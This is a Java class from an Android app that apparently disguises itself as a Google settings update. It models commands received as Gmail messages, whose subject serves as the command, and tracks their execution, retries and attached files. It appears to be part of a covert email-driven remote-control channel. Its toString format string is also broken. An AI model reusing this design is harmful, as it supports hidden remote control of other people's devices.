package com.setting.dl.google.googlesettingupdate.ptt.message;

import android.support.annotation.NonNull;

import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.ptt.command.ICommand;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.u;

import java.io.File;

public class Message implements IMessage, ICommand {
   
   private String subject;
   private String body;
   
   private final MessageType messageType;
   private       File        file;
   private       String      id;
   private       String      commandId;
   private       boolean     executing;
   private       boolean     executed;
   private       boolean     deleted;
   private final long        date;
   private       long        executingDate;
   private       long        executeDate;
   private       long        recieveDate;
   private       long        sendDate;
   private       int         tryCount;
   private       String      comments;
   
   public Message(MessageType messageType) {
      
      this.messageType = messageType;
      date = System.currentTimeMillis();
   }
   
   public Message(MessageType messageType, String commandId) {
      
      this.messageType = messageType;
      date = System.currentTimeMillis();
      this.commandId = commandId;
   }
   
   public Message(MessageType messageType, File file) {
      
      this.messageType = messageType;
      date = System.currentTimeMillis();
      this.file = file;
   }
   
   public Message(MessageType messageType, File file, String commandId) {
      
      this.messageType = messageType;
      date = System.currentTimeMillis();
      this.file = file;
      this.commandId = commandId;
   }
   
   public Message(com.google.api.services.gmail.model.Message message) {
      
      date = sendDate = message.getInternalDate();
      recieveDate = System.currentTimeMillis();
      messageType = MessageType.COMMAND;
      
      subject = Mail.getSubject(message);
      id = message.getId();
      commandId = id;
   }
   
   @Override
   public String getSubject() {
      return subject;
   }
   
   @Override
   public String getBody() {
      return body;
   }
   
   @Override
   public long getDate() {
      return date;
   }
   
   @Override
   public String getId() {
      return id;
   }
   
   @Override
   public String getCommandId() {
      return commandId;
   }
   
   @Override
   public void setCommandId(String commandId) {
      this.commandId = commandId;
   }
   
   @Override
   public String getCommand() {
      return subject;
   }
   
   @Override
   public int getTryCount() {
      return tryCount;
   }
   
   @Override
   public int incTryCount() {
      return ++tryCount;
   }
   
   @Override
   public boolean isExecuting() {
      return executing;
   }
   
   @Override
   public void addComment(String comment) {
   
      if (comments == null) {
         
         comments = comment;
      }
      else{
         
         comments += "\n" + comment;
      }
   }
   
   @Override
   public String getComments() {
      return comments;
   }
   
   @Override
   public void setExecuting(boolean isExecuting) {
      
      executing = isExecuting;
      
      if (executing) {
   
         tryCount++;
         executingDate = System.currentTimeMillis();
      }
   }
   
   @Override
   public long getExecutingDate() {
      return executingDate;
   }
   
   @Override
   public long getSendDate() {
      return sendDate;
   }
   
   @Override
   public long getRecieveDate() {
      return recieveDate;
   }
   
   @Override
   public long getExecuteDate() {
      return executeDate;
   }
   
   @Override
   public boolean isExecuted() {
      return executed;
   }
   
   @Override
   public void setExecuted() {
      
      executed = true;
      setExecuting(false);
      executeDate = System.currentTimeMillis();
   }
   
   @Override
   public boolean isDeleted() {
      return deleted;
   }
   
   @Override
   public void setDeleted() {
      
      deleted = true;
   }
   
   @Override
   public void setId(String id) {
      this.id = id;
   }
   
   @Override
   public MessageType getMessageType() {
      return messageType;
   }
   
   @Override
   public File getFile() {
      return file;
   }
   
   @Override
   public boolean equals(Object o) {
      
      return o instanceof IMessage && getBody().equals(((IMessage) o).getBody());
   }
   
   @Override
   public int hashCode() {
      
      return getBody().hashCode();
   }
   
   @Override
   public void setSubject(String subject) {
      this.subject = subject;
   }
   
   @Override
   public void setBody(String body) {
      this.body = body;
   }
   
   @Override
   public void setFile(File file) {
      this.file = file;
   }
   
   @NonNull
   @Override
   public String toString() {
      
      return u.format(
            
            "%n%n" +
            "\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF%n" +
            "id        : %s%n" +
            "commandId : %s%" +
            "type      : %s%n" +
            "subject   : %s%n" +
            "sDate     : %s%n" +
            "rDate     : %s%n" +
            "eDate     : %s%n" +
            "file      : %s%n" +
            "deleted   : %s%n" +
            "executed  : %s%n" +
            "executing : %s%n" +
            "tryCount  : %s%n" +
            "comments  : %s%n" +
            "\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF\u27FF",
            
            id,
            commandId,
            messageType,
            subject,
            sendDate != 0 ? Time.getDate(sendDate) : "-",
            recieveDate != 0 ? Time.getDate(recieveDate) : "-",
            executeDate != 0 ? Time.getDate(executeDate) : "-",
            file != null ? file.getName() : "-",
            deleted,
            executed,
            executing,
            tryCount,
            comments != null ? comments : "-"
      );
   }
}
